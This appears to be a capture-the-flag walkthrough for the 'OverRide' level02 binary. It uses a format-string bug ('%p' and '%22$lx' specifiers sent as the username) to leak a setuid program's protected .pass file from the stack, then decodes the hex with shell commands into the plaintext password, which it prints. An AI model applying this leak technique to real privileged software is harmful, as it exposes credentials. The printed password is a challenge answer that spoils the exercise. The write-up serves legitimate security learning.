# level02

By looking at the code and with `file` command, we can see that the program is for x64 architecture:

```bash
level02@OverRide:~$ file level02 
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

The program read the `.pass` file of the next level. When reading it, the program make checks that the length must be equal to 41.

To debug it in gdb, we extract the program to another machine to debug it. We create a file in `home/users/level03`.

```bash
┌──(vagrant㉿kali)-[~]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /home/users/level03/.pass
```

The first `fgets` will be printed as the only one argument of `printf` if the password read in the `.pass` and the password passed as input don't match.

We try to print the stack, by passing modifiers as first input and empty string as second one:

```bash
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p     
--[ Password: 
*****************************************
 0x7fff8c03a8d0 (nil) 0xffffffff 0x2a (nil) 0x7fff8c03aad8 0x100000000 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x8 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x41 0x2520702520702520 0x2070252070252070 0x7025207025207025 does not have access!
```

As we know what contains the `.pass` file, we can see that its content begins to pop at the 22th element until the 27th.

We can know try to pop up the content of the `.pass` file. We use `l` for print a long-sized integer as we are in x64 architecture, and `x` to print the result in hex:

```bash
--[ Username: %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx
--[ Password: 
*****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 does not have access!
```

Let's try to decode it. We first put it in file and reverse each 2 bytes:

```bash
level02@OverRide:~$ echo "756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d" > /tmp/test 
level02@OverRide:~$ dd conv=swab if=/tmp/test of=/tmp/result 2>/dev/null
level02@OverRide:~$ cat /tmp/result 
57e60525437386845414a4531637931573a7173475e4768553a45386e67485378433760566b493d4
```

We need then to reverse bytes order each 16 bytes and print the result as ASCII values:

```bash
level02@OverRide:~$ cat /tmp/result | fold -w 16 | rev | tr -d '\n' | xxd -r -p
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
